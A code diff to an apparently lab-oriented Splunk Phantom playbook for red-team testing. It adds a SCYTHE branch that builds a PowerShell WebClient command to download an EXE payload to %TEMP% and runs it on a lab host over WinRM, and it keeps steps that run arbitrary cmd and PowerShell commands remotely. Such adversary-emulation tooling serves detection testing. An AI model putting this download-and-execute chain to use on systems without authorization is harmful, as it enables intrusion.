@@ -5,6 +5,15 @@ import phantom.rules as phantom
 import json
 from datetime import datetime, timedelta
 
+##############################
+# Start - Global Code Block
+
+import platform
+import uuid
+
+# End - Global Code block
+##############################
+
 def on_start(container):
     phantom.debug('on_start() called')
     
@@ -21,12 +30,12 @@ def decision_1(action=None, success=None, container=None, results=None, handle=N
         container=container,
         action_results=results,
         conditions=[
-            ["artifact:*.cef.manual_command", "!=", "NA"],
+            ["artifact:*.cef.scythe_campaign", "!=", "NA"],
         ])
 
     # call connected blocks if condition 1 matched
     if matched_artifacts_1 or matched_results_1:
-        Run_Manual_Cmd(action=action, success=success, container=container, results=results, handle=handle)
+        list_campaigns_1(action=action, success=success, container=container, results=results, handle=handle)
         return
 
     # call connected blocks for 'else' condition 2
@@ -67,7 +76,7 @@ def Post_End_Event_to_Splunk(action=None, success=None, container=None, results=
     
     # collect data for 'post_data_2' call
     results_data_1 = phantom.collect2(container=container, datapath=['Post_Start_Event_to_Splunk:action_result.parameter.host', 'Post_Start_Event_to_Splunk:action_result.parameter.source_type', 'Post_Start_Event_to_Splunk:action_result.parameter.source', 'Post_Start_Event_to_Splunk:action_result.parameter.context.artifact_id', 'Post_Start_Event_to_Splunk:action_result.parameter.data', 'Post_Start_Event_to_Splunk:action_result.parameter.index'], action_results=results)
-    formatted_data_1 = phantom.get_format_data(name='format_4')
+    formatted_data_1 = phantom.get_format_data(name='Format_End_Event')
 
     parameters = []
     
@@ -92,9 +101,9 @@ def Post_End_Event_to_Splunk(action=None, success=None, container=None, results=
     return
 
 def Format_End_Event(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
-    phantom.debug('format_4() called')
+    phantom.debug('Format_End_Event() called')
     
-    template = """Finished red team test: {0} on machine with IP address: {1}"""
+    template = """Finished red team test: {0}  on machine with IP address: {1}"""
 
     # parameter list for template variable replacement
     parameters = [
@@ -102,7 +111,7 @@ def Format_End_Event(action=None, success=None, container=None, results=None, ha
         "artifact:*.cef.destinationAddress",
     ]
 
-    phantom.format(container=container, template=template, parameters=parameters, name="format_4")
+    phantom.format(container=container, template=template, parameters=parameters, name="Format_End_Event")
 
     Post_End_Event_to_Splunk(container=container)
 
@@ -197,9 +206,9 @@ def TODO_Run_Mac_Test(action=None, success=None, container=None, results=None, h
     return
 
 def Format_Start_Event(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
-    phantom.debug('format_3() called')
+    phantom.debug('Format_Start_Event() called')
     
-    template = """Started red team test: {0} on machine with IP address: {1}"""
+    template = """Started red team test: {0}  on machine with IP address: {1}"""
 
     # parameter list for template variable replacement
     parameters = [
@@ -207,7 +216,7 @@ def Format_Start_Event(action=None, success=None, container=None, results=None, 
         "artifact:*.cef.destinationAddress",
     ]
 
-    phantom.format(container=container, template=template, parameters=parameters, name="format_3")
+    phantom.format(container=container, template=template, parameters=parameters, name="Format_Start_Event")
 
     Post_Start_Event_to_Splunk(container=container)
 
@@ -229,13 +238,13 @@ def Run_Manual_Cmd(action=None, success=None, container=None, results=None, hand
         for results_item_1 in results_data_1:
             if results_item_1[0]:
                 parameters.append({
+                    'shell_id': "",
+                    'parser': "",
                     'ip_hostname': results_item_1[0],
                     'command': container_item[0],
                     'arguments': "",
-                    'parser': "",
                     'async': "",
                     'command_id': "",
-                    'shell_id': "",
                     # context (artifact id) is added to associate results with the artifact
                     'context': {'artifact_id': results_item_1[1]},
                 })
@@ -265,11 +274,9 @@ def Format_Start_Marker(action=None, success=None, container=None, results=None,
 
 def Post_Start_Event_to_Splunk(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
     phantom.debug('post_data_1() called')
-    import platform
-    import uuid
 
     # collect data for 'post_data_1' call
-    formatted_data_1 = phantom.get_format_data(name='format_3')
+    formatted_data_1 = phantom.get_format_data(name='Format_Start_Event')
 
     parameters = []
     
@@ -287,8 +294,11 @@ def Post_Start_Event_to_Splunk(action=None, success=None, container=None, result
     
     try:
         guid = phantom.collect(container, "artifact:*.cef.request")[0]
+        phantom.debug("collected GUID from artifact")
     except:
-        guid = uuid.uuid4().hex
+        guid = uuid.uuid4().hex    
+    phantom.debug(guid)
+    
     playbook_info = phantom.get_playbook_info()
     phantom.save_data(guid, playbook_info[0]['id'])
     source = playbook_info[0]['name']
@@ -461,15 +471,16 @@ def join_Format_End_Marker(action=None, success=None, container=None, results=No
     if phantom.get_run_data(key='join_Format_End_Marker_called'):
         return
     
+    if phantom.actions_done(['Run_Scythe_Campaign']):
+        phantom.save_run_data(key='join_Format_End_Marker_called', value='Format_End_Marker')
+        Format_End_Marker(container=container, handle=handle)
+        
     if phantom.actions_done(['Run_Manual_Cmd']):
         phantom.save_run_data(key='join_Format_End_Marker_called', value='Format_End_Marker')
-        
-        # call connected block "Format_End_Marker"
         Format_End_Marker(container=container, handle=handle)
+        
     elif phantom.actions_done(['Run_Manual_Powershell']):
         phantom.save_run_data(key='join_Format_End_Marker_called', value='Format_End_Marker')
-        
-        # call connected block "Format_End_Marker"
         Format_End_Marker(container=container, handle=handle)
 
     elif phantom.get_run_data(key='powershell_test') and phantom.get_run_data(key='cmd_test'):
@@ -703,15 +714,28 @@ def decision_3(action=None, success=None, container=None, results=None, handle=N
         container=container,
         action_results=results,
         conditions=[
-            ["artifact:*.cef.manual_powershell", "!=", "NA"],
+            ["artifact:*.cef.manual_command", "!=", "NA"],
         ])
 
     # call connected blocks if condition 1 matched
     if matched_artifacts_1 or matched_results_1:
+        Run_Manual_Cmd(action=action, success=success, container=container, results=results, handle=handle)
+        return
+
+    # check for 'elif' condition 2
+    matched_artifacts_2, matched_results_2 = phantom.condition(
+        container=container,
+        action_results=results,
+        conditions=[
+            ["artifact:*.cef.manual_powershell", "!=", "NA"],
+        ])
+
+    # call connected blocks if condition 2 matched
+    if matched_artifacts_2 or matched_results_2:
         Run_Manual_Powershell(action=action, success=success, container=container, results=results, handle=handle)
         return
 
-    # call connected blocks for 'else' condition 2
+    # call connected blocks for 'else' condition 3
     Format_ART_Command(action=action, success=success, container=container, results=results, handle=handle)
 
     return
@@ -732,18 +756,162 @@ def Run_Manual_Powershell(action=None, success=None, container=None, results=Non
         for results_item_1 in results_data_1:
             if results_item_1[0]:
                 parameters.append({
-                    'ip_hostname': results_item_1[0],
-                    'script_file': "",
-                    'script_str': container_item[0],
-                    'parser': "",
-                    'async': "",
-                    'command_id': "",
                     'shell_id': "",
+                    'parser': "",
+                    'ip_hostname': results_item_1[0],
+                    'async': "",
+                    'script_str': container_item[0],
+                    'script_file': "",
+                    'command_id': "",
                     # context (artifact id) is added to associate results with the artifact
                     'context': {'artifact_id': results_item_1[1]},
                 })
 
     phantom.act("run script", parameters=parameters, app={ "name": 'Windows Remote Management' }, callback=join_Format_End_Marker, name="Run_Manual_Powershell")
+
+    return
+
+def list_campaigns_1(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('list_campaigns_1() called')
+    
+    #phantom.debug('Action: {0} {1}'.format(action['name'], ('SUCCEEDED' if success else 'FAILED')))
+
+    parameters = []
+
+    phantom.act("list campaigns", parameters=parameters, assets=['scythe_demo'], callback=filter_4, name="list_campaigns_1")
+
+    return
+
+def filter_4(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('filter_4() called')
+
+    # collect filtered artifact ids for 'if' condition 1
+    matched_artifacts_1, matched_results_1 = phantom.condition(
+        container=container,
+        action_results=results,
+        conditions=[
+            ["list_campaigns_1:action_result.data.*.name", "==", "artifact:*.cef.scythe_campaign"],
+        ],
+        name="filter_4:condition_1")
+
+    # call connected blocks if filtered artifacts or results
+    if matched_artifacts_1 or matched_results_1:
+        list_payloads_1(action=action, success=success, container=container, results=results, handle=handle, filtered_artifacts=matched_artifacts_1, filtered_results=matched_results_1)
+
+    return
+
+def list_payloads_1(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('list_payloads_1() called')
+    
+    #phantom.debug('Action: {0} {1}'.format(action['name'], ('SUCCEEDED' if success else 'FAILED')))
+    
+    # collect data for 'list_payloads_1' call
+    filtered_results_data_1 = phantom.collect2(container=container, datapath=["filtered-data:filter_4:condition_1:list_campaigns_1:action_result.data.*.name", "filtered-data:filter_4:condition_1:list_campaigns_1:action_result.parameter.context.artifact_id"])
+
+    parameters = []
+    
+    # build parameters list for 'list_payloads_1' call
+    for filtered_results_item_1 in filtered_results_data_1:
+        if filtered_results_item_1[0]:
+            parameters.append({
+                'campaign_name': filtered_results_item_1[0],
+                # context (artifact id) is added to associate results with the artifact
+                'context': {'artifact_id': filtered_results_item_1[1]},
+            })
+
+    phantom.act("list payloads", parameters=parameters, assets=['scythe_demo'], callback=build_download_cmd, name="list_payloads_1")
+
+    return
+
+def download_payload(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('download_payload() called')
+    
+    #phantom.debug('Action: {0} {1}'.format(action['name'], ('SUCCEEDED' if success else 'FAILED')))
+    
+    build_download_cmd__download_cmd = json.loads(phantom.get_run_data(key='build_download_cmd:download_cmd'))
+    # collect data for 'download_payload' call
+    results_data_1 = phantom.collect2(container=container, datapath=['Run_Start_Marker:action_result.parameter.ip_hostname', 'Run_Start_Marker:action_result.parameter.context.artifact_id'], action_results=results)
+
+    parameters = []
+    
+    # build parameters list for 'download_payload' call
+    for results_item_1 in results_data_1:
+        if results_item_1[0]:
+            parameters.append({
+                'ip_hostname': results_item_1[0],
+                'script_file': "",
+                'script_str': build_download_cmd__download_cmd,
+                'parser': "",
+                'async': "",
+                'command_id': "",
+                'shell_id': "",
+                # context (artifact id) is added to associate results with the artifact
+                'context': {'artifact_id': results_item_1[1]},
+            })
+
+    phantom.act("run script", parameters=parameters, assets=['winrm_dect_lab'], callback=Run_Scythe_Campaign, name="download_payload", parent_action=action)
+
+    return
+
+def Run_Scythe_Campaign(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('Run_Scythe_Campaign() called')
+    
+    #phantom.debug('Action: {0} {1}'.format(action['name'], ('SUCCEEDED' if success else 'FAILED')))
+    
+    build_download_cmd__file_path = json.loads(phantom.get_run_data(key='build_download_cmd:file_path'))
+    # collect data for 'Run_Scythe_Campaign' call
+    results_data_1 = phantom.collect2(container=container, datapath=['download_payload:action_result.parameter.ip_hostname', 'download_payload:action_result.parameter.context.artifact_id'], action_results=results)
+
+    parameters = []
+    
+    # build parameters list for 'Run_Scythe_Campaign' call
+    for results_item_1 in results_data_1:
+        if results_item_1[0]:
+            parameters.append({
+                'ip_hostname': results_item_1[0],
+                'command': build_download_cmd__file_path,
+                'arguments': "",
+                'parser': "",
+                'async': "",
+                'command_id': "",
+                'shell_id': "",
+                # context (artifact id) is added to associate results with the artifact
+                'context': {'artifact_id': results_item_1[1]},
+            })
+
+    phantom.act("run command", parameters=parameters, assets=['winrm_dect_lab'], callback=join_Format_End_Marker, name="Run_Scythe_Campaign", parent_action=action)
+
+    return
+
+def build_download_cmd(action=None, success=None, container=None, results=None, handle=None, filtered_artifacts=None, filtered_results=None):
+    phantom.debug('build_download_cmd() called')
+    results_data_1 = phantom.collect2(container=container, datapath=['list_payloads_1:action_result.data.*.64-bit EXE'], action_results=results)
+    results_item_1_0 = [item[0] for item in results_data_1]
+
+    build_download_cmd__download_cmd = None
+    build_download_cmd__file_path = None
+
+    ################################################################################
+    ## Custom Code Start
+    ################################################################################
+
+    # Write your custom code here...
+    playbook_info = phantom.get_playbook_info()
+    guid = phantom.get_data(playbook_info[0]['id'], clear_data=False)
+    file_name = str(guid) + ".exe"
+    
+    posh_path = "$env:TEMP\\" + file_name
+    build_download_cmd__file_path = "%TEMP%\\" + file_name
+    
+    build_download_cmd__download_cmd = '(New-Object System.Net.WebClient).DownloadFile("{url}", "{path}")'.format(url=results_item_1_0[0], path=posh_path) 
+
+    ################################################################################
+    ## Custom Code End
+    ################################################################################
+
+    phantom.save_run_data(key='build_download_cmd:download_cmd', value=json.dumps(build_download_cmd__download_cmd))
+    phantom.save_run_data(key='build_download_cmd:file_path', value=json.dumps(build_download_cmd__file_path))
+    download_payload(container=container)
 
     return
 
